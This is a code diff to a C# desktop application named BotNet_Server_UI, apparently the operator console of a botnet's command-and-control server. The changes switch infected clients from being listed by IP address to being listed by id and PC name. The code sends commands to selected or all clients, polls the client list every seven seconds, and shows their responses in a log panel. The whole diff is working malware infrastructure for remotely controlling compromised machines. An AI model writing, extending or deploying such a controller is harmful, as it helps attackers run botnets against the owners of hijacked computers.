@@ -21,6 +21,7 @@ namespace BotNet_Server_UI
         public string[] ips;
         dynamic[] args = new dynamic[0];
         string argtype = null;
+        IP[] arr;
         public MainWindow()
         {
             InitializeComponent();
@@ -57,7 +58,7 @@ namespace BotNet_Server_UI
                 Message message = new Message()
                 {
                     command = command,
-                    ip = ipsall ? ClientList.Text.Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToArray() : ips
+                    ids = ipsall ? arr.Select(x => x.id.ToString()).ToArray() : ips
                 };
                 Uri res = await ApiRequest.CreateProductAsync(message, "messages");
                 LogPanel.Text += $"Команда {showcommand} (id: {await ApiRequest.GetProductAsync<uint>("api/v1/messages") - 1}) отправлена.\n";
@@ -104,7 +105,7 @@ namespace BotNet_Server_UI
             {
                 while (true)
                 {
-                    IP[] arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/ip");
+                    arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/client");
                     if (arr == null)
                     {
                         continue;
@@ -112,11 +113,11 @@ namespace BotNet_Server_UI
                     string res = "";
                     for (int i = 0; i < arr.Length; i++)
                     {
-                        if (arr[i].ip == "")
+                        if (arr[i].nameofpc == "")
                         {
                             continue;
                         }
-                        res += arr[i].ip + "\n";
+                        res += "Id: " + arr[i].id + " - " + arr[i].nameofpc + "\n";
                     }
                     await ClientList.Dispatcher.BeginInvoke(new Action(() => ClientList.Text = res));
                     Thread.Sleep(7000);
@@ -150,22 +151,22 @@ namespace BotNet_Server_UI
                         isFirstIter = false;
                         for (int i = 0; i < responses.Length; i++)
                         {
-                            vars.Add(await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1);
+                            vars.Add(await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].id}") - 1);
                         }
                     }
                     if (vars.Count != responses.Length)
                     {
                         for (int i = vars.Count; i < responses.Length; i++)
                         {
-                            vars.Add(await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1);
+                            vars.Add(await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].id}") - 1);
                         }
                     }
                     for (int i = 0; i < responses.Length; i++)
                     {
-                        uint var1 = await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1;
+                        uint var1 = await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].id}") - 1;
                         if (var1 == vars[i])
                         {
-                            Response response = await ApiRequest.GetProductAsync<Response>($"api/v1/responses/{responses[i].ip}/{var1}");
+                            Response response = await ApiRequest.GetProductAsync<Response>($"api/v1/responses/{responses[i].id}/{var1}");
                             if (response != null)
                             {
                                 await LogPanel.Dispatcher.BeginInvoke(new Action(() => LogPanel.Text += response.response + "\n"));
